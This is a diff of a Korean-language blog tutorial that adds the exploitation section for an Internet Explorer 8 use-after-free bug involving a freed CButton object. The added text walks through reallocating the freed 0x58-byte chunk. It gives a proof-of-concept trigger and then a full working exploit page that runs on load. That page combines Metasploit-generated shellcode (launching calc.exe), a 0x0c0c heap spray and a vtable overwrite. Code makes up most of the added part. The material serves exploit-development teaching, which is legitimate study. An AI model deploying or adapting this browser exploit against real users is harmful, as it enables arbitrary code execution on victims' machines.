@@ -395,11 +395,175 @@ ust : 유저 스택 트레이스 설정으로 유저모드의 스택 결과를 �
 
 <p>그래서 다른 레퍼런스를 제거하는 것으로 인해 객체가 해제되지만 Cdoc 객체에서 DefaultElem을 통해 계속 접근 가능한 것으로 판단됩니다.</p>
 
+<h5 id="exploit">Exploit</h5>
+
+<p>본격적으로 Exploit을 진행해보도록 하겠습니다.</p>
+
+<p>CButton 객체를 CollectGarbage로 해제한 후에도 CButton을 사용하려고 해서 문제가 생겼죠?</p>
+
+<p>그렇다는 말은 CollectGarbage로 해제한 후에 CButton 객체를 가르키고 있던 곳을</p>
+
+<p>쉘 코드가 있는 곳을 가르키도록 만들면 되겠네요.</p>
+
+<p>어떻게 해야 해당 위치를 재할당받아서 우리가 원하는 값을 넣을 수 있을까요?</p>
+
+<p>CreateElement의 HeapAlloc 과정을 다시 살펴보겠습니다.</p>
+
+<figure>
+  <img data-action="zoom" src="/assets/images/windows/0x0e_16.png" alt="[그림 1-16]" />
+</figure>
+
+<p>CButton을 할당할 때 0x58만큼(88 바이트) 메모리에 할당하는 것을 알 수 있습니다.</p>
+
+<p>0x58만큼 할당하고 해제한 뒤 0x58만큼 다시 할당 요청을 하면 CButton 객체가 사용했던 위치를 다시 할당해줄 것입니다.</p>
+
+<p>gflag.exe로 힙 페이지와 스택 트레이스 설정을 해제하고 코드를 수정하겠습니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gflag.exe /i iexplore.exe -hpa -ust
+</code></pre></div></div>
+
+<p>아래 코드는 글 맨 처음에 소개했던 코드에서 재할당하는 부분까지 포함된 것 입니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">helloWorld</span><span class="p">(){</span>
+	<span class="kd">var</span> <span class="nx">e0</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">e1</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">e2</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+	
+	<span class="k">try</span><span class="p">{</span>
+		<span class="nx">e0</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"a"</span><span class="p">);</span>	<span class="c1">// form</span>
+		<span class="nx">e1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"b"</span><span class="p">);</span> <span class="c1">// dfn</span>
+		<span class="nx">e2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"q"</span><span class="p">);</span> <span class="c1">// q</span>
+		<span class="nx">e1</span><span class="p">.</span><span class="nx">applyElement</span><span class="p">(</span><span class="nx">e2</span><span class="p">);</span>
+		<span class="nx">e1</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'button'</span><span class="p">));</span>
+		<span class="nx">e1</span><span class="p">.</span><span class="nx">applyElement</span><span class="p">(</span><span class="nx">e0</span><span class="p">);</span>
+		<span class="nx">e2</span><span class="p">.</span><span class="nx">outerText</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+		<span class="nx">e2</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'body'</span><span class="p">));</span>
+		<span class="nx">CollectGarbage</span><span class="p">();</span>
+		<span class="nx">e0</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s2">"</span><span class="err">\</span><span class="s2">u4148</span><span class="err">\</span><span class="s2">u4B43AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"eval(helloWorld())"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"a"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/form&gt;</span>
+	<span class="nt">&lt;dfn</span> <span class="na">id=</span><span class="s">"b"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/dfn&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>CollectGarbage 바로 아래에 e0.className 부분을 통해서 Vtable 자리에 0x58만큼 재할당하고 있습니다.</p>
+
+<p>이 코드를 다시 한 번 Windbg로 살펴보겠습니다.</p>
+
+<figure>
+  <img data-action="zoom" src="/assets/images/windows/0x0e_17.png" alt="[그림 1-17]" />
+</figure>
+
+<p>edi를 살펴보니 우리가 입력한 값이 제대로 들어간 것을 알 수 있습니다.</p>
+
+<p>그럼 이제 남은 일은 HeapSpray로 쉘 코드를 Heap에 뿌려준 다음, vtable 값을 예측 가능한 주소로 할당하는 것입니다.</p>
+
+<p>드디어 최종 코드입니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;SCRIPT</span> <span class="na">language=</span><span class="s">"JavaScript"</span><span class="nt">&gt;</span>
+function padnum(n, numdigits)
+{
+n = n.toString();
+var pnum = '';
+if (numdigits &gt; n.length)
+{
+for (z = 0; z <span class="nt">&lt;</span> <span class="err">(</span><span class="na">numdigits</span> <span class="na">-</span> <span class="na">n</span><span class="err">.</span><span class="na">length</span><span class="err">);</span> <span class="na">z</span><span class="err">++)</span>
+<span class="na">pnum</span> <span class="err">+=</span> <span class="err">'</span><span class="na">0</span><span class="err">';</span>
+<span class="err">}</span>
+<span class="na">return</span> <span class="na">pnum</span> <span class="err">+</span> <span class="na">n</span><span class="err">.</span><span class="na">toString</span><span class="err">();</span>
+<span class="err">}</span>
+<span class="na">var</span> <span class="na">calc</span><span class="err">,</span> <span class="na">chunk_size</span><span class="err">,</span> <span class="na">headersize</span><span class="err">,</span> <span class="na">nopsled</span><span class="err">,</span> <span class="na">nopsled_len</span><span class="err">,</span> <span class="na">code</span><span class="err">;</span>
+<span class="na">var</span> <span class="na">heap_chunks</span><span class="err">,</span> <span class="na">i</span><span class="err">,</span> <span class="na">codewithnum</span><span class="err">;</span>
+<span class="err">//</span>
+<span class="err">//</span> <span class="na">ruby</span> <span class="na">msfpayload</span> <span class="na">windows</span><span class="err">/</span><span class="na">exec</span> <span class="na">cmd=</span><span class="s">calc.exe</span> <span class="na">J</span>
+<span class="err">//</span> <span class="na">windows</span><span class="err">/</span><span class="na">exec</span> <span class="na">-</span> <span class="na">200</span> <span class="na">bytes</span>
+<span class="err">//</span> <span class="na">http:</span><span class="err">//</span><span class="na">www</span><span class="err">.</span><span class="na">metasploit</span><span class="err">.</span><span class="na">com</span>
+<span class="err">//</span> <span class="na">VERBOSE=</span><span class="s">false,</span> <span class="na">EXITFUNC=</span><span class="s">process,</span> <span class="na">CMD=</span><span class="s">calc.exe</span>
+<span class="err">//</span>
+<span class="na">calc =</span><span class="err"> </span><span class="s">unescape(</span>
+<span class="err">"%</span><span class="na">ue8fc</span><span class="err">%</span><span class="na">u0089</span><span class="err">%</span><span class="na">u0000</span><span class="err">%</span><span class="na">u8960</span><span class="err">%</span><span class="na">u31e5</span><span class="err">%</span><span class="na">u64d2</span><span class="err">%</span><span class="na">u528b</span><span class="err">%</span><span class="na">u8b30</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u0c52</span><span class="err">%</span><span class="na">u528b</span><span class="err">%</span><span class="na">u8b14</span><span class="err">%</span><span class="na">u2872</span><span class="err">%</span><span class="na">ub70f</span><span class="err">%</span><span class="na">u264a</span><span class="err">%</span><span class="na">uff31</span><span class="err">%</span><span class="na">uc031</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u3cac</span><span class="err">%</span><span class="na">u7c61</span><span class="err">%</span><span class="na">u2c02</span><span class="err">%</span><span class="na">uc120</span><span class="err">%</span><span class="na">u0dcf</span><span class="err">%</span><span class="na">uc701</span><span class="err">%</span><span class="na">uf0e2</span><span class="err">%</span><span class="na">u5752</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u528b</span><span class="err">%</span><span class="na">u8b10</span><span class="err">%</span><span class="na">u3c42</span><span class="err">%</span><span class="na">ud001</span><span class="err">%</span><span class="na">u408b</span><span class="err">%</span><span class="na">u8578</span><span class="err">%</span><span class="na">u74c0</span><span class="err">%</span><span class="na">u014a</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u50d0</span><span class="err">%</span><span class="na">u488b</span><span class="err">%</span><span class="na">u8b18</span><span class="err">%</span><span class="na">u2058</span><span class="err">%</span><span class="na">ud301</span><span class="err">%</span><span class="na">u3ce3</span><span class="err">%</span><span class="na">u8b49</span><span class="err">%</span><span class="na">u8b34</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">ud601</span><span class="err">%</span><span class="na">uff31</span><span class="err">%</span><span class="na">uc031</span><span class="err">%</span><span class="na">uc1ac</span><span class="err">%</span><span class="na">u0dcf</span><span class="err">%</span><span class="na">uc701</span><span class="err">%</span><span class="na">ue038</span><span class="err">%</span><span class="na">uf475</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u7d03</span><span class="err">%</span><span class="na">u3bf8</span><span class="err">%</span><span class="na">u247d</span><span class="err">%</span><span class="na">ue275</span><span class="err">%</span><span class="na">u8b58</span><span class="err">%</span><span class="na">u2458</span><span class="err">%</span><span class="na">ud301</span><span class="err">%</span><span class="na">u8b66</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u4b0c</span><span class="err">%</span><span class="na">u588b</span><span class="err">%</span><span class="na">u011c</span><span class="err">%</span><span class="na">u8bd3</span><span class="err">%</span><span class="na">u8b04</span><span class="err">%</span><span class="na">ud001</span><span class="err">%</span><span class="na">u4489</span><span class="err">%</span><span class="na">u2424</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u5b5b</span><span class="err">%</span><span class="na">u5961</span><span class="err">%</span><span class="na">u515a</span><span class="err">%</span><span class="na">ue0ff</span><span class="err">%</span><span class="na">u5f58</span><span class="err">%</span><span class="na">u8b5a</span><span class="err">%</span><span class="na">ueb12</span><span class="err">%</span><span class="na">u5d86</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u016a</span><span class="err">%</span><span class="na">u858d</span><span class="err">%</span><span class="na">u00b9</span><span class="err">%</span><span class="na">u0000</span><span class="err">%</span><span class="na">u6850</span><span class="err">%</span><span class="na">u8b31</span><span class="err">%</span><span class="na">u876f</span><span class="err">%</span><span class="na">ud5ff</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">uf0bb</span><span class="err">%</span><span class="na">ua2b5</span><span class="err">%</span><span class="na">u6856</span><span class="err">%</span><span class="na">u95a6</span><span class="err">%</span><span class="na">u9dbd</span><span class="err">%</span><span class="na">ud5ff</span><span class="err">%</span><span class="na">u063c</span><span class="err">%</span><span class="na">u0a7c</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">ufb80</span><span class="err">%</span><span class="na">u75e0</span><span class="err">%</span><span class="na">ubb05</span><span class="err">%</span><span class="na">u1347</span><span class="err">%</span><span class="na">u6f72</span><span class="err">%</span><span class="na">u006a</span><span class="err">%</span><span class="na">uff53</span><span class="err">%</span><span class="na">u63d5</span><span class="err">"</span> <span class="err">+</span>
+<span class="err">"%</span><span class="na">u6c61</span><span class="err">%</span><span class="na">u2e63</span><span class="err">%</span><span class="na">u7865</span><span class="err">%</span><span class="na">u0065</span><span class="err">");</span>
+<span class="err">//</span>
+<span class="na">chunk_size =</span><span class="err"> </span><span class="s">0x40000;</span>
+<span class="na">headersize =</span><span class="err"> </span><span class="s">0x24;</span>
+<span class="na">nopsled =</span><span class="err"> </span><span class="s">unescape("%u0c0c%u0c0c");</span> <span class="err">//</span> <span class="na">0x7c376224</span> <span class="na">RETN</span> <span class="err">[</span><span class="na">MSVCR71</span><span class="err">.</span><span class="na">dll</span><span class="err">]</span>
+<span class="na">nopsled_len =</span><span class="err"> </span><span class="s">chunk_size</span> <span class="na">-</span> <span class="err">(</span><span class="na">headersize</span> <span class="err">+</span> <span class="na">calc</span><span class="err">.</span><span class="na">length</span><span class="err">);</span>
+<span class="na">while</span> <span class="err">(</span><span class="na">nopsled</span><span class="err">.</span><span class="na">length</span> <span class="err">&lt;</span> <span class="na">nopsled_len</span><span class="err">)</span>
+<span class="na">nopsled</span> <span class="err">+=</span> <span class="na">nopsled</span><span class="err">;</span>
+<span class="na">nopsled =</span><span class="err"> </span><span class="s">nopsled.substring(0,</span> <span class="na">nopsled_len</span><span class="err">);</span>
+<span class="na">code =</span><span class="err"> </span><span class="s">nopsled</span> <span class="err">+</span> <span class="na">calc</span><span class="err">;</span>
+<span class="na">heap_chunks =</span><span class="err"> </span><span class="s">new</span> <span class="na">Array</span><span class="err">();</span>
+<span class="na">for</span> <span class="err">(</span><span class="na">i =</span><span class="err"> </span><span class="s">0</span> <span class="err">;</span> <span class="na">i</span> <span class="err">&lt;</span> <span class="na">1000</span> <span class="err">;</span> <span class="na">i</span><span class="err">++)</span>
+<span class="err">{</span>
+<span class="na">codewithnum =</span><span class="err"> </span><span class="s">padnum(i,4)</span> <span class="err">+</span> <span class="na">code</span><span class="err">;</span>
+<span class="na">heap_chunks</span><span class="err">[</span><span class="na">i</span><span class="err">]</span> <span class="err">=</span> <span class="na">codewithnum</span><span class="err">.</span><span class="na">substring</span><span class="err">(</span><span class="na">0</span><span class="err">,</span> <span class="na">codewithnum</span><span class="err">.</span><span class="na">length</span><span class="err">);</span>
+<span class="err">}</span> <span class="err">//</span> <span class="na">heap</span> <span class="na">spray</span>
+<span class="na">function</span> <span class="na">helloWorld</span><span class="err">(){</span>
+<span class="na">var</span> <span class="na">e0 =</span><span class="err"> </span><span class="s">null;</span>
+<span class="na">var</span> <span class="na">e1 =</span><span class="err"> </span><span class="s">null;</span>
+<span class="na">var</span> <span class="na">e2 =</span><span class="err"> </span><span class="s">null;</span>
+
+<span class="na">try</span><span class="err">{</span>
+	<span class="na">e0 =</span><span class="err"> </span><span class="s">document.getElementById("a");</span>	<span class="err">//</span> <span class="na">form</span>
+	<span class="na">e1 =</span><span class="err"> </span><span class="s">document.getElementById("b");</span> <span class="err">//</span> <span class="na">dfn</span>
+	<span class="na">e2 =</span><span class="err"> </span><span class="s">document.createElement("q");</span> <span class="err">//</span> <span class="na">q</span>
+	<span class="na">e1</span><span class="err">.</span><span class="na">applyElement</span><span class="err">(</span><span class="na">e2</span><span class="err">);</span>
+	<span class="na">e1</span><span class="err">.</span><span class="na">appendChild</span><span class="err">(</span><span class="na">document</span><span class="err">.</span><span class="na">createElement</span><span class="err">('</span><span class="na">button</span><span class="err">'));</span>
+	<span class="na">e1</span><span class="err">.</span><span class="na">applyElement</span><span class="err">(</span><span class="na">e0</span><span class="err">);</span>
+	<span class="na">e2</span><span class="err">.</span><span class="na">outerText=</span><span class="s">""</span><span class="err">;</span>
+	<span class="na">e2</span><span class="err">.</span><span class="na">appendChild</span><span class="err">(</span><span class="na">document</span><span class="err">.</span><span class="na">createElement</span><span class="err">('</span><span class="na">body</span><span class="err">'));</span>
+	<span class="na">CollectGarbage</span><span class="err">();</span>
+	<span class="na">e0</span><span class="err">.</span><span class="na">className =</span><span class="err"> </span><span class="s">"\u0c0c\u0c0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="err">;</span>
+<span class="err">}</span> <span class="na">catch</span><span class="err">(</span><span class="na">e</span><span class="err">){}</span>
+
+<span class="err">}</span>
+<span class="err">&lt;/</span><span class="na">script</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"eval(helloWorld())"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"a"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;dfn</span> <span class="na">id=</span><span class="s">"b"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/dfn&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>위 코드를 실행한 결과 아래와 같이 계산기가 정상적으로 실행된 것을 볼 수 있습니다.</p>
+
+<figure>
+  <img data-action="zoom" src="/assets/images/windows/0x0e_18.png" alt="[그림 1-18]" />
+</figure>
 <hr />
 
-<p>긴 글 읽으시느라 고생하셨습니다.</p>
+<p>첫 번째 IE8 Exploit 설명을 모두 마쳤습니다.</p>
 
-<p>설명이 너무 길어져서 실제 공격은 다음 글로 넘겨서 진행하겠습니다.</p>
+<p>다음 글에서는 IE 10 Exploit을 다루어보도록 하겠습니다.</p>
 
                 </div>
             </section>
